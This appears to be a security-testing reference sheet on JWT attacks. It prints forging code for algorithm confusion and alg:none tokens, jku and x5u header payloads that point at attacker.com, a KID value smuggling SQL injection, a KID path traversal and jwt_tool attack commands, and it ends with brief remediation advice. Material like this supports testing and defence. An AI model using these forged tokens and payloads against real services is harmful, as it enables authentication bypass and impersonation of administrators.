# API Reference: JWT Algorithm Confusion Attack

## JWT Structure

### Three parts (dot-separated, Base64URL-encoded)
```
<header>.<payload>.<signature>
```

### Header
```json
{"alg": "RS256", "typ": "JWT"}
```

### Common Algorithms
| Algorithm | Type | Key |
|-----------|------|-----|
| HS256 | HMAC | Symmetric shared secret |
| RS256 | RSA | Asymmetric key pair |
| ES256 | ECDSA | Asymmetric key pair |
| none | None | No signature |

## Algorithm Confusion Attack

### Attack Flow
1. Server uses RS256 (asymmetric) with public/private key pair
2. Attacker obtains server's RSA public key
3. Attacker changes `alg` header from RS256 to HS256
4. Attacker signs token with the RSA public key as HMAC secret
5. Server verifies with public key using HMAC (accepts token)

### Forging with Public Key
```python
import hmac, hashlib, base64, json

header = base64url(json.dumps({"alg": "HS256", "typ": "JWT"}))
payload = base64url(json.dumps({"sub": "admin"}))
signature = hmac.new(public_key_bytes, f"{header}.{payload}", hashlib.sha256)
token = f"{header}.{payload}.{base64url(signature)}"
```

## None Algorithm Attack

### Forged Token
```python
header = base64url('{"alg":"none","typ":"JWT"}')
payload = base64url('{"sub":"admin","admin":true}')
token = f"{header}.{payload}."
```

## JWT Header Injection Attacks

### JKU (JSON Web Key Set URL)
```json
{"alg": "RS256", "jku": "https://attacker.com/.well-known/jwks.json"}
```

### X5U (X.509 URL)
```json
{"alg": "RS256", "x5u": "https://attacker.com/cert.pem"}
```

### KID (Key ID) — SQL Injection
```json
{"alg": "HS256", "kid": "key1' UNION SELECT 'secret'--"}
```

### KID — Path Traversal
```json
{"alg": "HS256", "kid": "../../dev/null"}
```

## Python PyJWT Library

### Decode without verification
```python
import jwt
decoded = jwt.decode(token, options={"verify_signature": False})
```

### Verify with algorithm restriction
```python
decoded = jwt.decode(token, public_key, algorithms=["RS256"])
```

## jwt_tool — JWT Testing Tool

### Scan for vulnerabilities
```bash
python3 jwt_tool.py <token> -M at    # All tests
python3 jwt_tool.py <token> -X a     # alg:none attack
python3 jwt_tool.py <token> -X k -pk public.pem  # Key confusion
```

## Remediation
1. Always specify allowed algorithms: `algorithms=["RS256"]`
2. Never accept `alg: none`
3. Use separate verification logic for symmetric vs asymmetric
4. Validate JKU/X5U against allowlist
